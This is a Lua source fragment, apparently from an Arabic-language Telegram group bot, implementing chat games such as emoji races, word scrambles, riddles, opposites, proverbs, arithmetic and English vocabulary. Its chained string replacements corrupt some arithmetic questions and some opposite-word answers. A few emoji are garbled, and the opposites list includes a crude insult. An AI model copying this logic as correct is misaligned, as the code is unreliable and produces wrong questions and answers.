name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','??')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
DevTwixTeam = '⋄︙اول واحد يدز هذا السمايل يربح » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » سمايلات للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end

if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) or text == '» ترتيب ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
DevTwixTeam = '⋄︙اول واحد يرتبها يربح » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » ترتيب للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) or text == '» محيبس ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevHmD:set(DevTwix.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
⋄︙اختر رقم لاستخراج المحيبس
⋄︙الفائز يحصل على (5) نقاط
]]
Dev_HmD(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevHmD:setex(DevTwix.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) or text == '» حزوره ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
DevTwixTeam = '⋄︙اول واحد يحلها يربح » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » حزوره للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) or text == '» معاني ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum2'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
DevTwixTeam = '⋄︙ما معنى هذا السمايل :؟ » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum2'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » المعاني للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) or text == '» العكس ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum3'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
DevTwixTeam = '⋄︙ما هو عكس كلمة » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum3'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » العكس للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) or text == '» المختلف ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum4'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️??‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','??🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
DevTwixTeam = '⋄︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum4'..msg.chat_id_) and not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » المختلف للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) or text == '» امثله ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum5'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
DevTwixTeam = '⋄︙اكمل المثال التالي » ['..name..']'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum5'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevHmD:del(DevTwix..'HmD:GameNum5'..msg.chat_id_)
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » امثله للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) or text == '» رياضيات ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum6'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
DevTwixTeam = '⋄︙اكمل المعادله التاليه » \n{'..name..'} '
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum6'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevHmD:del(DevTwix..'HmD:GameNum6'..msg.chat_id_)
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » رياضيات للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) or text == '» انكليزي ✧' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Games'..msg.chat_id_) then
DevHmD2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevHmD2[math.random(#DevHmD2)]
DevHmD:set(DevTwix..'HmD:GameNum7'..msg.chat_id_,name)
DevHmD:del(DevTwix..'HmD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
DevTwixTeam = '⋄︙ما معنى كلمة » '..name
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
return false
end end
if text == DevHmD:get(DevTwix..'HmD:GameNum7'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Games:Ids'..msg.chat_id_) then 
DevHmD:incrby(DevTwix..'HmD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevHmD:del(DevTwix..'HmD:GameNum7'..msg.chat_id_)
DevTwixTeam = '⋄︙مبروك لقد ربحت في اللعبه \n⋄︙ارسل » انكليزيه للعب مره اخرى'
Dev_HmD(msg.chat_id_, msg.id_, 1,DevTwixTeam, 1, 'md')
end
DevHmD:set(DevTwix..'HmD:Games:Ids'..msg.chat_id_,true)
end  
---------------------------------------------------------------------------------------
